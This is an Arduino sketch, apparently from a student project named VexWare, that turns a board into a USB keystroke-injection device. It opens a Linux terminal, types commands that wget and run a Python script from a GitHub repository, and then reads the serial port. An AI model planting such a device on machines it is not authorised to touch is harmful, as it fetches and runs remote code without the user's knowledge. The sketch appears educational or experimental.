
#include <Keyboard.h>

int hasRun = 0;
unsigned long td = 3000; // delay after each keystroke
long baudRate = 9600;

void setup() {
  pinMode(2, INPUT_PULLUP);
  pinMode(21, OUTPUT);
  digitalWrite(21,HIGH); // turn off LED 
  Keyboard.begin();
}

void loop() {
  // Add delay to allow target system to recognize Arduino as keyboard
  delay(800);

  // loop will only run if D2 is pulled low to prevent accidental keystroke injections
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
      // Begin keystroke sequence
      // Try opening Linux terminal with several popular shortcuts.
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(td); // let animation play

      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(td); // let animation play  

      // Install pip on local user, without sudo permissions
      Keyboard.print("wget https://bootstrap.pypa.io/get-pip.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(5000); // let animation play 

      Keyboard.print("python3 get-pip.py --user");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(5000); // let animation play 

      // Pip install pyserial
      Keyboard.print("pip install pyserial");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(5000); // let pyserial install

      // Download python script from repo
      Keyboard.print("wget https://raw.githubusercontent.com/olincollege/VexWare/master/src/os_recognition/test_serial_linux.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(3000); // get file

      // Run python script
      Keyboard.print("python3 test_serial_linux.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(td); // get file

      // End keyboard emulation and begin reading serial port
      Keyboard.end();
      delay(td);

      Serial.begin(baudRate);

      while (1){
        // Check if data is available to read from serial
        if (Serial.available() > 0) {
          String receivedString = Serial.readStringUntil('\n');
          digitalWrite(21,LOW); // turn on LED 
          delay(1000);
        }
      digitalWrite(21,HIGH); // turn off LED 
      delay(1000);
      }
      
    }
  }
}
